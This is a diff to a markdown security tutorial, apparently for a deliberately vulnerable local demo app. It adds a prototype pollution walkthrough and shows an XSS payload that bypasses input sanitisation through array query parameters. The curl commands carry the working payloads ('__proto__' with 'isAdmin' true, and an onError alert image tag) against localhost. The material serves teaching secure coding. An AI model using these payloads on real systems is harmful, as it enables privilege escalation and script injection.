@@ -133,7 +133,7 @@ Still, we get results back. Even though, supposedly we should only be accepting 
 We send in a query parameter that is a string but contains a malicious payload but it gets sanitized correctly per our logic:
 
 ```bash
-$ curl -G -X 'GET' -H 'accept: application/json' "http://localhost:8080/users/component" --data-urlencode "name=<img liran"
+curl -G -X 'GET' -H 'accept: application/json' "http://localhost:8080/users/component" --data-urlencode "name=<img liran"
 
 Bad input detected!
 ```
@@ -141,7 +141,35 @@ Bad input detected!
 What happens if we update the query string so that the field is to be interpreted as an array instead of a string?
 
 ```bash
-$ curl -G -X 'GET' -H 'accept: application/json' "http://localhost:8080/users/component" --data-urlencode "name[]=<img src=x onError=alert(1) />"           
+curl -G -X 'GET' -H 'accept: application/json' "http://localhost:8080/users/component" --data-urlencode "name[]=<img src=x onError=alert(1) />"           
 
 <h1>Hello, <img src=x onError=alert(1) />!</h1>
+```
+
+### TypeScript Security Bypass #4
+
+Let's bypass both TypeScript types and Zod schema input validation.
+
+First off, a safe request:
+
+```bash
+curl http://localhost:8080/users/1/settings | jq
+```
+
+Let's set a setting to enabled:
+
+```bash
+curl -X POST -H 'Content-Type: application/json' http://localhost:8080/users/settings -d '{"darkmode": true}' 
+```
+
+Now let's specifically set the notifications settings
+
+```bash
+curl -X PUT -H 'Content-Type: application/json' http://localhost:8080/users/1/settings/notifications -d '{"notificationType": "email", "notificationMode": "daily", "notificationModeValue": "disabled"}'
+```
+
+Now let's abuse this with a prototype pollution payload:
+
+```bash
+curl -X PUT -H 'Content-Type: application/json' http://localhost:8080/users/1/settings/notifications -d '{"notificationType": "__proto__", "notificationMode": "isAdmin", "notificationModeValue": true}'
 ```
